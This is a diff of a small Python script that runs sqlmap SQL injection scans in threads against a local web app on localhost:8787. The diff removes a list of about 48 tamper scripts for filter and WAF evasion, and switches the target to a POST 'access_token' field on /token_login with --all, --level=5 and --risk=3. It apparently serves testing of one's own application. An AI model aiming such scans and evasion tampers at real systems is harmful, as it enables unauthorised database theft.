@@ -1,53 +1,4 @@
-tampers = [
-    "0eunion",
-    "apostrophemask",
-    "apostrophenullencode",
-    "base64encode",
-    "between",
-    "binary",
-    "bluecoat",
-    "chardoubleencode",
-    "charencode",
-    "charunicodeescape",
-    "commentbeforeparentheses",
-    "decentities",
-    "equaltolike",
-    "equaltorlike",
-    "escapequotes",
-    "greatest",
-    "hexentities",
-    "htmlencode",
-    "if2case",
-    "ifnull2casewhenisnull",
-    "ifnull2ifisnull",
-    "informationschemacomment",
-    "least",
-    "lowercase",
-    "luanginx",
-    "multiplespaces",
-    "ord2ascii",
-    "overlongutf8",
-    "overlongutf8more",
-    "randomcase",
-    "randomcomments",
-    "schemasplit",
-    "scientific",
-    "sleep2getlock",
-    "sp_password",
-    "space2comment",
-    "space2dash",
-    "space2morecomment",
-    "space2mssqlhash",
-    "space2plus",
-    "space2randomblank",
-    "substring2leftright",
-    "symboliclogical",
-    "unionalltounion",
-    "unmagicquotes",
-    "uppercase",
-    "varnish",
-    "xforwardedfor",
-]
+tampers = []
 
 import subprocess
 import threading
@@ -71,7 +22,7 @@ threads = []
 # Function to run a command in a separate thread
 def run_command_thread(command):
     result = run_command(
-        'sqlmap -u "http://localhost:8787/card_login?card_id=111" -p card_id --batch --dbms=sqlite --all --ignore-code 400 --level=5 --risk=3 --random-agent --tamper={}'.format(
+        'sqlmap -u "http://localhost:8787/token_login" --data="access_token=1" --batch --dbms=mysql --all --ignore-code 400 --level=5 --risk=3 --random-agent --smart --tamper={}'.format(
             command
         )
     )
